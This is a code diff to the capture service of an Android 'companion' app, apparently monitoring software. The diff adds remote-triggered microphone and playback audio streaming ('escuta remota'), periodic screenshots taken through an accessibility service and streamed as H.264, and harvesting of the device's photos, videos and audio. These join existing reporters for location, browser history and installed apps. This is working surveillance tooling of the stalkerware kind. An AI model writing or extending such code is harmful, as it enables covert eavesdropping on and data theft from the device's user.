@@ -9,8 +9,13 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentSender
 import android.content.pm.ServiceInfo
+import android.graphics.Bitmap
 import android.graphics.SurfaceTexture
 import android.hardware.display.DisplayManager
+import android.media.Image
+import android.media.MediaCodec
+import android.media.MediaCodecInfo
+import android.media.MediaFormat
 import android.hardware.display.VirtualDisplay
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
@@ -23,6 +28,7 @@ import android.util.Log
 import android.view.Surface
 import android.view.WindowManager
 import androidx.core.app.NotificationCompat
+import com.screenporter.companion.capture.AudioCapturer
 import com.screenporter.companion.capture.VideoEncoder
 import com.screenporter.companion.location.LocationReporter
 import com.screenporter.companion.monitoring.AlertDetector
@@ -42,6 +48,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 /**
  * Foreground service that handles capture (VÍDEO or ECRÃ), network (WebSocket),
@@ -68,6 +76,7 @@ class CaptureService : Service() {
         const val EXTRA_RESULT_DATA = "result_data"
         const val ACTION_START = "com.screenporter.companion.START"
         const val ACTION_STOP = "com.screenporter.companion.STOP"
+        const val ACTION_REEVALUATE = "com.screenporter.companion.REEVALUATE"
 
         @Volatile
         var instance: CaptureService? = null
@@ -106,6 +115,17 @@ class CaptureService : Service() {
     private var videoEncoder: VideoEncoder? = null
     private var wakeLock: PowerManager.WakeLock? = null
 
+    // Escuta remota (áudio do dispositivo → dashboard).
+    private var audioCapturer: AudioCapturer? = null
+    @Volatile private var micFgsActive = false
+
+    // Modo ECRÃ: screenshot → YUV → MediaCodec H.264 (portado do totalcontrol)
+    private var screenEncoder: MediaCodec? = null
+    @Volatile private var screenRunning = false
+    private var screenPts = 0L
+
+    private var mediaReporter: MediaReporter? = null
+
     override fun onCreate() {
         super.onCreate()
         instance = this
@@ -122,7 +142,11 @@ class CaptureService : Service() {
                 updateNotification(currentMode, false)
             }
             override fun onControl(message: WsMessage.Control) {
-                ControlAccessibilityService.instance?.handleControl(message)
+                when (message.command) {
+                    "audio_start" -> startAudioCapture(message.source ?: "playback")
+                    "audio_stop" -> stopAudioCapture()
+                    else -> ControlAccessibilityService.instance?.handleControl(message)
+                }
             }
             override fun onText(message: String) {
                 Log.d(TAG, "WS text: $message")
@@ -144,6 +168,21 @@ class CaptureService : Service() {
                 stopForeground(STOP_FOREGROUND_REMOVE)
                 stopSelf()
                 return START_NOT_STICKY
+            }
+            ACTION_REEVALUATE -> {
+                // Vídeo revogado (MediaProjection parou) — desce para ECRÃ ou CONTROLO
+                // sem reiniciar o WebSocket nem os reporters. (igual ao totalcontrol)
+                stopVideoMode()
+                stopScreenMode()
+                val canUseScreen = com.screenporter.companion.util.PermissionState.isAccessibilityEnabled(this) &&
+                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
+                if (canUseScreen) {
+                    startScreenMode()
+                } else {
+                    startControlMode()
+                }
+                startForegroundWithNotification(false)
+                updateNotification(currentMode, prefs.isConnected)
             }
             ACTION_START, null -> {
                 val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
@@ -224,6 +263,10 @@ class CaptureService : Service() {
             installedAppsReporter = InstalledAppsReporter(this@CaptureService, prefs, api)
             installedAppsReporter?.start()
 
+            // Media (fotos, vídeos, áudios do MediaStore)
+            mediaReporter = MediaReporter(this@CaptureService, prefs)
+            mediaReporter?.start()
+
             prefs.isConnected = true
             prefs.hasVideoAuth = canUseVideo
             updateNotification(currentMode, true)
@@ -246,9 +289,14 @@ class CaptureService : Service() {
             // (igual ao totalcontrol)
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
-                    Log.w(TAG, "MediaProjection stopped — falling back to ECRÃ")
-                    stopVideoMode()
-                    if (currentMode == CaptureMode.VIDEO) startScreenMode()
+                    Log.w(TAG, "MediaProjection stopped — requesting mode re-evaluation")
+                    try {
+                        startService(Intent(this@CaptureService, CaptureService::class.java).apply {
+                            action = ACTION_REEVALUATE
+                        })
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to request re-evaluation", e)
+                    }
                 }
             }, Handler(Looper.getMainLooper()))
 
@@ -283,30 +331,173 @@ class CaptureService : Service() {
     }
 
     /**
-     * ECRÃ mode: takeScreenshot via AccessibilityService → encode ~1/s.
-     * Doesn't need video permission — survives reboot.
+     * ECRÃ mode: takeScreenshot via AccessibilityService → Bitmap → YUV → MediaCodec
+     * → H.264 Annex-B → WebSocket. ~1 imagem/seg, mas sobrevive a reinícios sem
+     * autorização de vídeo nova. (portado do totalcontrol)
      */
     private fun startScreenMode() {
         currentMode = CaptureMode.SCREEN
         Log.i(TAG, "Started in ECRÃ mode (screenshot-based)")
-        // The ControlAccessibilityService.takeScreenshot() will be called periodically.
-        // For a working implementation, encode via MediaCodec from the bitmap — this requires
-        // a software encoder pipeline (Bitmap → YUV → MediaCodec). For brevity here,
-        // we mark the mode and the periodic screenshot loop is in captureLoop().
+
+        val (w, h) = scaledVideoSize(
+            resources.displayMetrics.widthPixels,
+            resources.displayMetrics.heightPixels
+        )
+
+        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, w, h).apply {
+            setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
+            setInteger(MediaFormat.KEY_BIT_RATE, 800_000)
+            setInteger(MediaFormat.KEY_FRAME_RATE, 2)
+            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2)
+            setInteger(MediaFormat.KEY_BITRATE_MODE, MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_VBR)
+        }
+
+        val codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
+        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
+        codec.start()
+        screenEncoder = codec
+        screenRunning = true
+        screenPts = 0L
+
+        Thread({ drainScreenEncoder(codec) }, "sp-screen-drain").apply { isDaemon = true }.start()
+
         scope.launch {
-            while (currentMode == CaptureMode.SCREEN) {
-                kotlinx.coroutines.delay(1_000) // 1 fps
-                val acc = ControlAccessibilityService.instance
-                acc?.takeScreenshot { bitmap ->
-                    if (bitmap != null) {
-                        // TODO: encode bitmap → MediaCodec H.264 → ws.sendBinaryFrame(...)
-                        // For now we just log; the full bitmap pipeline is implemented in
-                        // ScreenshotEncoder.kt (omitted here for brevity).
-                        Log.d(TAG, "Screenshot captured (${bitmap.width}x${bitmap.height})")
-                    }
+            while (screenRunning && currentMode == CaptureMode.SCREEN) {
+                val inicio = System.currentTimeMillis()
+                val bmp = capturarUmaImagem()
+                if (bmp != null) {
+                    try { feedScreenEncoder(bmp, w, h) } catch (_: Exception) {}
+                    bmp.recycle()
+                }
+                val espera = 1000 - (System.currentTimeMillis() - inicio)
+                if (espera > 0) kotlinx.coroutines.delay(espera)
+            }
+        }
+    }
+
+    private fun capturarUmaImagem(): Bitmap? {
+        val svc = ControlAccessibilityService.instance ?: return null
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
+        var resultado: Bitmap? = null
+        val latch = CountDownLatch(1)
+        svc.takeScreenshot { bmp -> resultado = bmp; latch.countDown() }
+        try { latch.await(2, TimeUnit.SECONDS) } catch (_: InterruptedException) {}
+        return resultado
+    }
+
+    private fun feedScreenEncoder(bitmap: Bitmap, w: Int, h: Int) {
+        val codec = screenEncoder ?: return
+        val idx = codec.dequeueInputBuffer(100_000)
+        if (idx < 0) return
+        val image = codec.getInputImage(idx) ?: run {
+            codec.queueInputBuffer(idx, 0, 0, 0, 0); return
+        }
+        val escalado = Bitmap.createScaledBitmap(bitmap, image.width, image.height, true)
+        preencherYuv(image, escalado)
+        if (escalado !== bitmap) escalado.recycle()
+        screenPts += 500_000
+        codec.queueInputBuffer(idx, 0, image.width * image.height * 3 / 2, screenPts, 0)
+    }
+
+    private fun preencherYuv(image: Image, bitmap: Bitmap) {
+        val w = image.width
+        val h = image.height
+        val argb = IntArray(w * h)
+        bitmap.getPixels(argb, 0, w, 0, 0, w, h)
+        val yP = image.planes[0]; val uP = image.planes[1]; val vP = image.planes[2]
+        val yB = yP.buffer; val uB = uP.buffer; val vB = vP.buffer
+        for (j in 0 until h) {
+            for (i in 0 until w) {
+                val p = argb[j * w + i]
+                val r = (p shr 16) and 0xff; val g = (p shr 8) and 0xff; val b = p and 0xff
+                val y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
+                yB.put(j * yP.rowStride + i * yP.pixelStride, y.coerceIn(0, 255).toByte())
+                if (j % 2 == 0 && i % 2 == 0) {
+                    val u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
+                    val v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
+                    val lin = j / 2; val col = i / 2
+                    uB.put(lin * uP.rowStride + col * uP.pixelStride, u.coerceIn(0, 255).toByte())
+                    vB.put(lin * vP.rowStride + col * vP.pixelStride, v.coerceIn(0, 255).toByte())
                 }
             }
         }
+    }
+
+    private fun drainScreenEncoder(codec: MediaCodec) {
+        val info = MediaCodec.BufferInfo()
+        var frameCount = 0
+        var configCache: ByteArray? = null
+        try {
+            while (screenRunning) {
+                val idx = try {
+                    codec.dequeueOutputBuffer(info, 100_000)
+                } catch (e: Exception) {
+                    Log.e(TAG, "screen drain dequeue failed after $frameCount frames", e)
+                    break
+                }
+                when {
+                    idx == MediaCodec.INFO_TRY_AGAIN_LATER -> continue
+                    idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> continue
+                    idx >= 0 -> {
+                        try {
+                            val buf = codec.getOutputBuffer(idx)
+                            if (buf != null && info.size > 0) {
+                                val data = ByteArray(info.size)
+                                buf.position(info.offset)
+                                buf.get(data, 0, info.size)
+
+                                val isConfig = info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG != 0
+                                var isKey = info.flags and MediaCodec.BUFFER_FLAG_KEY_FRAME != 0
+                                if (!isConfig && !isKey && contemIdr(data)) isKey = true
+
+                                if (isConfig) configCache = data.copyOf()
+
+                                val payload = if (isKey && !isConfig && configCache != null) {
+                                    ByteArray(configCache!!.size + data.size).also {
+                                        System.arraycopy(configCache!!, 0, it, 0, configCache!!.size)
+                                        System.arraycopy(data, 0, it, configCache!!.size, data.size)
+                                    }
+                                } else data
+
+                                ws.sendBinaryFrame(payload, isKey, isConfig, info.presentationTimeUs)
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "screen frame #$frameCount failed", e)
+                        }
+                        frameCount++
+                        try { codec.releaseOutputBuffer(idx, false) } catch (_: Exception) {}
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "screen drain died after $frameCount frames", e)
+        }
+        Log.w(TAG, "screen drain stopped — total frames: $frameCount")
+    }
+
+    private fun contemIdr(dados: ByteArray): Boolean {
+        var i = 0
+        val n = dados.size
+        while (i + 3 < n) {
+            if (dados[i].toInt() == 0 && dados[i + 1].toInt() == 0) {
+                var j = i + 2
+                if (j < n && dados[j].toInt() == 0) j++
+                if (j < n && dados[j].toInt() == 1 && j + 1 < n) {
+                    val nalType = dados[j + 1].toInt() and 0x1F
+                    if (nalType == 5) return true
+                    i = j + 2
+                    continue
+                }
+            }
+            i++
+        }
+        return false
+    }
+
+    private fun stopScreenMode() {
+        screenRunning = false
+        try { screenEncoder?.stop(); screenEncoder?.release() } catch (_: Exception) {}
+        screenEncoder = null
     }
 
     /**
@@ -318,20 +509,25 @@ class CaptureService : Service() {
     }
 
     /**
-     * WakeLock parcial: mantém o CPU (e a thread de rede) vivos quando o ecrã se
-     * desliga / o aparelho entra em Doze. Sem isto, a ligação caía sozinha após
-     * alguns minutos (code 1006) com o telemóvel no bolso. Para ser mesmo
-     * persistente é preciso TAMBÉM isentar a app da otimização de bateria.
+     * WakeLock: mantém o ecrã ligado (dimmed) para o MediaProjection não capturar
+     * preto. SCREEN_DIM_WAKE_LOCK é necessário para espelhamento — sem ele o ecrã
+     * desliga após o timeout e todo o vídeo fica preto. ACQUIRE_CAUSES_WAKEUP
+     * acende o ecrã se já estiver desligado. Para ser persistente é preciso TAMBÉM
+     * isentar a app da otimização de bateria.
      */
+    @Suppress("DEPRECATION")
     private fun acquireWakeLock() {
         try {
             if (wakeLock?.isHeld == true) return
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenPorter::captura").apply {
+            wakeLock = pm.newWakeLock(
+                PowerManager.SCREEN_DIM_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                "ScreenPorter::captura"
+            ).apply {
                 setReferenceCounted(false)
                 acquire()
             }
-            Log.i(TAG, "WakeLock adquirido")
+            Log.i(TAG, "WakeLock (screen-dim) adquirido")
         } catch (e: Exception) {
             Log.w(TAG, "Falha a adquirir WakeLock", e)
         }
@@ -342,17 +538,87 @@ class CaptureService : Service() {
         wakeLock = null
     }
 
+    // --- Escuta remota (áudio do dispositivo → dashboard) -------------------
+
+    private fun startAudioCapture(sourceStr: String) {
+        stopAudioCapture()
+        val useMic = sourceStr == "mic"
+        val src = if (useMic) AudioCapturer.Source.MIC else AudioCapturer.Source.PLAYBACK
+        if (useMic) {
+            if (!com.screenporter.companion.util.PermissionState.isMicGranted(this)) {
+                ws.sendText("""{"t":"audio_error","message":"Microfone sem permissão no dispositivo"}""")
+                return
+            }
+            ensureMicForegroundType(true)
+        }
+        val cap = AudioCapturer(
+            source = src,
+            projection = projection,
+            onPcm = { pcm -> ws.sendAudioFrame(pcm) },
+            onError = { m -> ws.sendText("""{"t":"audio_error","message":"${jsonEsc(m)}"}""") }
+        )
+        audioCapturer = cap
+        val ok = cap.start()
+        if (ok) {
+            ws.sendText(
+                """{"t":"audio_meta","active":true,"sampleRate":${cap.sampleRate},"channels":${cap.channels},"source":"${if (useMic) "mic" else "playback"}"}"""
+            )
+            Log.i(TAG, "Escuta iniciada ($sourceStr)")
+        } else {
+            audioCapturer = null
+            if (useMic) ensureMicForegroundType(false)
+        }
+    }
+
+    private fun stopAudioCapture() {
+        val cap = audioCapturer
+        audioCapturer = null
+        cap?.stop()
+        if (micFgsActive) ensureMicForegroundType(false)
+        if (cap != null) {
+            try { ws.sendText("""{"t":"audio_meta","active":false}""") } catch (_: Exception) {}
+            Log.i(TAG, "Escuta parada")
+        }
+    }
+
     /**
-     * Reduz o lado maior para ~900 px, preservando a proporção e mantendo as
-     * dimensões pares (exigência do H.264). Alivia muito a banda e os picos dos
-     * keyframes no acesso remoto. (igual ao totalcontrol)
+     * Android 14+ exige que o tipo 'microphone' esteja ativo no serviço em
+     * primeiro plano para captar o microfone. Reafirma o startForeground com (ou
+     * sem) esse tipo, conforme a escuta por microfone começa/termina.
+     */
+    private fun ensureMicForegroundType(enable: Boolean) {
+        if (Build.VERSION.SDK_INT < 34) { micFgsActive = enable; return }
+        if (enable == micFgsActive) return
+        try {
+            val notif = buildNotification(currentMode, prefs.isConnected)
+            var tipo = if (prefs.hasVideoAuth && currentMode == CaptureMode.VIDEO)
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+            else ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
+                tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            }
+            if (enable) tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            startForeground(NOTIF_ID, notif, tipo)
+            micFgsActive = enable
+        } catch (e: Exception) {
+            Log.e(TAG, "ensureMicForegroundType($enable) falhou", e)
+        }
+    }
+
+    private fun jsonEsc(s: String): String =
+        s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", " ")
+
+    /**
+     * Reduz o lado maior para ~900 px, preservando a proporção e alinhando as
+     * dimensões a 16 px (macroblock boundary). Chipsets MediaTek (Helio) podem
+     * crashar silenciosamente com dimensões não-alinhadas. (igual ao totalcontrol)
      */
     private fun scaledVideoSize(w: Int, h: Int): Pair<Int, Int> {
         if (w <= 0 || h <= 0) return Pair(720, 1600)
         val maior = maxOf(w, h)
         val escala = if (maior > 900) 900.0 / maior else 1.0
-        fun par(v: Int) = (v - (v % 2)).coerceAtLeast(2)
-        return Pair(par((w * escala).toInt()), par((h * escala).toInt()))
+        fun align16(v: Int) = ((v + 8) / 16 * 16).coerceAtLeast(16)
+        return Pair(align16((w * escala).toInt()), align16((h * escala).toInt()))
     }
 
     private fun stopVideoMode() {
@@ -369,7 +635,9 @@ class CaptureService : Service() {
     }
 
     private fun stopCapture() {
+        stopAudioCapture()
         stopVideoMode()
+        stopScreenMode()
         ws.stop()
         locationReporter?.stop()
         locationReporter = null
@@ -383,6 +651,8 @@ class CaptureService : Service() {
         browserHistoryReporter = null
         installedAppsReporter?.stop()
         installedAppsReporter = null
+        mediaReporter?.stop()
+        mediaReporter = null
         releaseWakeLock()
         currentMode = CaptureMode.NONE
         prefs.isConnected = false
